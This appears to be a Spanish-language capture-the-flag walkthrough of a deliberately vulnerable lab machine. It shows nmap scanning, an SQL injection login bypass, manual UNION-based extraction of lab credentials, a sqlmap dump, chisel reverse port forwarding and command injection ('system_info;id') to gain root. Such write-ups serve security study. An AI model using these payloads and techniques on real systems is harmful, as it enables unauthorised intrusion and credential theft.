# Enumeracion de Puertos, Servicios y Versiones

```bash
nmap -Pn -n -sS -sCV -p- --min-rate 5000 172.17.0.2
```

![image](https://github.com/user-attachments/assets/bed28ac4-dca5-4090-b373-8ab6e4135643)

observams que la maquina tiene los puertos 22 (ssh) y 80 (http) abiertos, asi que comenzamos analizando el servicio web

![image](https://github.com/user-attachments/assets/6be635b9-a19b-4f26-90a9-53b1580b7c09)

despues de analizar el codigo fuente no observamos nada fuera de lo normal asi que nos vamos a iniciar sesion

![image](https://github.com/user-attachments/assets/a8f1312b-afaf-4aa4-b3d5-2adb301e28d4)

como no tenemos credenciales de acceso comenzare testeando si llega ser vulnerable a inyeccion sql

https://github.com/user-attachments/assets/86a9460a-e5bb-4860-a64b-138194c2be97

como podemos ver, al testear con solo colocar una comilla simple `'` da un error en la base de datos, esto ya es un claro indicativo de que estamos frente a un panel vulnerable a inyeccion sql por lo que intentaremos explotarlo

![image](https://github.com/user-attachments/assets/7a502ebf-6157-41ca-804d-d5cbb28876c0)

intentamos primero con una inyeccion basica para bypassear el login y logramos acceso

```bash
usuario: admin' OR 1=1-- -
password: cualquier cosa
```

![image](https://github.com/user-attachments/assets/034f86ee-3a7f-42d0-910c-424ed3de8807)

una vez dentro testeo creando un nuevo arte `Artwork`

![image](https://github.com/user-attachments/assets/174b3227-ccdf-4e25-a4ea-7684a3ef5457)

tambien veo que el buscador es inyectable

![image](https://github.com/user-attachments/assets/c9532847-1282-4d8d-bc4a-2e15fd80da24)

ahora vamos a intectar extraer informacion de la base de datos explotando la vulnerabilidad, esta vez lo haremos de forma manual y no automatizada con sqlmap.
Lo primero sera determinar el numero de columnas y para eso usaremo el siguiente payload en la url

```bash
http://172.17.0.2/dashboard.php?search_term=-1' UNION SELECT 1,2,3,4,5,6,7,8,9-- -

-1 : para olcultar la consulta anterior a la nuestra
UNION SELECT 1,2,3,4,5,6,7,8,9-- - : aqui vamos a ir testeando la cantidad de columnas, si falla entonces disminuimos sino aumentamos

```

![image](https://github.com/user-attachments/assets/cc0f020b-e515-459a-ac1d-953c916905a2)

vemos que falla con 9 columnas asi que vamos a ir disminuyendo hasta que deje de fallar

![image](https://github.com/user-attachments/assets/96aaec26-4db4-4c78-85dd-ff3233e3a4f1)

con 8 tambien falla asiq ue continuamos bajando

![image](https://github.com/user-attachments/assets/f1b7db4d-54cd-4d0d-b777-a424049aa840)

con 7 tambien falla asi que bajamos aun mas

![image](https://github.com/user-attachments/assets/b329feba-8e21-4c45-a85a-fc4c45e9f062)

con 6 tambien falla

![image](https://github.com/user-attachments/assets/c47164a4-0487-4c67-939c-d08c201ce189)

con 5 no falla por lo que ya sabemos cuantas columnas tiene la base de datos, tambien vemos que se imprimen los numeros 2 y 3, esto nos indica que en estos campos podemos filtrar informacion asi que vamos a ir inyectando consultas

```bash
http://172.17.0.2/dashboard.php?search_term=-1%27%20UNION%20SELECT%201,@@version,database(),4,5--%20-
```

![image](https://github.com/user-attachments/assets/fb111cd0-d142-4285-9a41-e95dc0426ba9)

ahora sabemos que estamos frente a un servidor `ubuntu` y que la base de datos de llama `gallery_db`, continuaremos extrayendo informacion, vamos a listar las tablas

```bash
http://172.17.0.2/dashboard.php?search_term=-1%27%20UNION%20SELECT%201,2,GROUP_CONCAT(table_name),4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=%27gallery_db%27--%20-
```

![image](https://github.com/user-attachments/assets/c3f5b33a-8eac-483e-b10d-4e4429a62e06)

vemos que existe la tabla `users` asi que vamos a extraer informacion de esa tabla

```bash
http://172.17.0.2/dashboard.php?search_term=-1%27%20UNION%20SELECT%201,2,column_name,4,5%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27users%27--%20-
```

![image](https://github.com/user-attachments/assets/a4725b9d-a31c-47ac-a7c1-653240e29f2d)


obtenemos las 3 (id, username y password) columnas de la tabla `users`. Ahora extraemos la informacion de las columnas `username` y `password`


```bash
http://172.17.0.2/dashboard.php?search_term=-1%27%20UNION%20SELECT%201,2,GROUP_CONCAT(username,%27:%27,password),4,5%20FROM%20users--%20-
```

![image](https://github.com/user-attachments/assets/702ee405-f275-4d7c-a37e-946773ad87b3)

ahora tenemos una credencial valida

```bash
admin:2O]L)W{6c>Xx=Eu2#SV82%O%$#W}b3<
```

solo que esta credencial no es valida para un acceso via ssh, por lo que vamos a buscar mas bases de datos, vamos a extraer todas las bases de datos

```bash
http://172.17.0.2/dashboard.php?search_term=-1%27%20union%20select%201,2,group_concat(schema_name),4,5%20from%20information_schema.schemata--%20-
```

![image](https://github.com/user-attachments/assets/83ef2548-7413-42b1-8425-3034706afef8)

la que parece de interes es `secret_db` asi que vamos a extraer informacion de ella a continuacion

```bash
http://172.17.0.2/dashboard.php?search_term=-1%27%20UNION%20SELECT%201,2,GROUP_CONCAT(table_name),4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=%27secret_db%27--%20-
```

![image](https://github.com/user-attachments/assets/88785c93-6fd3-4c8d-8731-4c762091dde8)

por lo visto solo tiene una tabla asi que extraemos informacion de la tabla `secret` 

```bash
http://172.17.0.2/dashboard.php?search_term=-1%27%20UNION%20SELECT%201,2,GROUP_CONCAT(column_name),4,5%20FROM%20information_schema.columns%20WHERE%20table_schema=%27secret_db%27--%20-
```

![image](https://github.com/user-attachments/assets/1488f537-2c7f-48e3-ae84-b5c477d17cbd)

ahora podemos ver las columnas `id,ssh_users,ssh_pass` por lo que vamos a extraer la informacion finalmente

```bash
http://172.17.0.2/dashboard.php?search_term=-1%27%20UNION%20SELECT%201,2,group_concat(ssh_users,%27:%27,ssh_pass),4,5%20from%20secret_db.secret--%20-
```

![image](https://github.com/user-attachments/assets/4b2e3e5c-40c0-46aa-b5e0-0e6a054b63a0)

y obtenemos las credenciales: `sam:$uper$ecretP4$$w0rd123` por lo que accedemos via ssh

![image](https://github.com/user-attachments/assets/21008830-ac7b-49ce-befb-76e35d222ffc)

si quieres ahorrarte todo el proceso de explotacion manual de sql, podemos automatizar el proceso con sqlmap ejecutando

```bash
sqlmap -u 'http://172.17.0.2/dashboard.php?search_term=test' --cookie=PHPSESSID=f6bbt7ba2dr8sofum5ed6g8j43 --dbms=MySQL -D secret_db -T secret -C ssh_users,ssh_pass --dump
```

![image](https://github.com/user-attachments/assets/04efaa93-68f0-41d6-b8e7-7fe83153907e)

ten en cuenta que deberas modificar la cookie de session para que funcione, ahora si continuamos

# Escalada de Privilegios

## User sam

comenzamos verificando permisos sudo pero este usuario no cuenta con ninguno, por lo que pasamos a chequear los procesos 

```bash
ps auxf
```

![image](https://github.com/user-attachments/assets/fb3beff9-0c38-49b8-9dc3-84a0f0e858e3)

lo que llama mi atencion es el proceso 

```bash
root 1  0.0  0.0   2800  1748 ?  Ss   18:04   0:00 /bin/sh -c service ssh start && service mysql start && php -S 0.0.0.0:80 -t /var/www/html &  php -S 127.0.0.1:8888 -t /var/www/terminal && tail -f /dev/null
```

 ya que observo que se levanta un servicio web por el puerto `8888`, intento observar de que trata con curl pero no esta instalado

![image](https://github.com/user-attachments/assets/cc3bb743-98db-4a1e-9e72-df9116f260f2)

asi que ahora instentamos con wget

```bash
wget http://127.0.0.1:8888
```

![image](https://github.com/user-attachments/assets/fd870c66-cf12-498c-abb3-aaf46065a81e)

vemos que se descarga el archivo index.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Secret Terminal</title>
    <style>
        :root {
            --terminal-bg: #1a1a2e;
            --terminal-text: #00ff00;
            --terminal-prompt: #ff0000;
        }
        body {
            background-color: var(--terminal-bg);
            color: var(--terminal-text);
            font-family: 'Courier New', monospace;
            margin: 0;
            padding: 20px;
            height: 100vh;
            box-sizing: border-box;
        }
        .terminal {
            background-color: rgba(0,0,0,0.3);
            padding: 20px;
            border-radius: 5px;
            border: 1px solid var(--terminal-text);
            height: calc(100vh - 80px);
            overflow-y: auto;
        }
        .output {
            white-space: pre-wrap;
            margin-bottom: 20px;
        }
        .prompt {
            color: var(--terminal-prompt);
            margin-right: 10px;
        }
        .command-form {
            display: flex;
            gap: 10px;
        }
        input[type="text"] {
            background-color: transparent;
            border: none;
            color: var(--terminal-text);
            font-family: 'Courier New', monospace;
            font-size: 16px;
            flex-grow: 1;
            outline: none;
        }
        .hidden {
            position: absolute;
            left: -9999px;
        }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="output">
   ______      _ _                
  / ____/___ _/ / /__  _______  __
 / / __/ __ `/ / / _ \/ ___/ / / /
/ /_/ / /_/ / / /  __/ /  / /_/ / 
\____/\__,_/_/_/\___/_/   \__, /  
                         /____/   
Gallery Management System v1.0
--------------------------------
[?] Try thinking outside the box
</div>
        <form method="POST" class="command-form">
            <span class="prompt">root@Gallery:~#</span>
            <input type="text" name="command" autofocus autocomplete="off">
            <input type="submit" class="hidden">
        </form>
    </div>
    <script>
        document.querySelector('.terminal').scrollTop = document.querySelector('.terminal').scrollHeight;
    </script>
</body>
</html>

```

por lo que parece es posible la ejecucion de comandos de sistema, pero al no tener curl instalado para enviar los comandos tocara usar chisel para hacer portforwarding del puerto 8888 hasta nuestra maquina atacante por lo que enviamos el binario de chisel a la maquina

```bash
scp chisel sam@172.17.0.2:/home/sam/
```


![image](https://github.com/user-attachments/assets/5d7580d8-d4af-4306-b27b-69e944412f40)



![image](https://github.com/user-attachments/assets/5dfc68bf-49e8-4944-86f0-05cb12e8e805)



vemos que ya lo tenemos disponible asi que hacemos portforwarding del puerto 8888

```bash
./chisel client 172.17.0.1:90 R:8888:localhost:8888 & # en la maquina comprometida
```

```bash
chisel server --reverse -p 90 # en nuestra maquina atacante
```


![image](https://github.com/user-attachments/assets/153d6c57-2a81-4d3c-ab5b-406845eb3175)

ahora podremos acceder al servicio web desde nuestra maquina atacante


![image](https://github.com/user-attachments/assets/6a4990e3-9c21-4c10-9868-5f5ebd6dde77)


intentaremos ir ejecutando comandos


![image](https://github.com/user-attachments/assets/f6f7dd8e-5caa-4eec-9592-3748e6e7604b)

parece que no es posible ejecutar cualquier comando asi que veremos la ayuda que ofrece


![image](https://github.com/user-attachments/assets/386ba929-2df1-4432-b36f-6b4142665b12)


tenemos un menu con los comandos que podemos ejecutar, pero si intentamos inyectar comandos lo logramos, solo debemos ejecutar un comando permitido seguido de un comando del sistema, ejemplo: `system_info;id` y lograriamos ejecucion de comandos


https://github.com/user-attachments/assets/d095265b-9c97-44d0-abf8-55d3df61a7c9

para una escalada rapida a root hacemos lo siguiente


https://github.com/user-attachments/assets/cd1c30a7-c16f-4ed6-8ee9-d3269c5bfccb

logramos comprometer el sistema entero obteniendo acceso root!!!










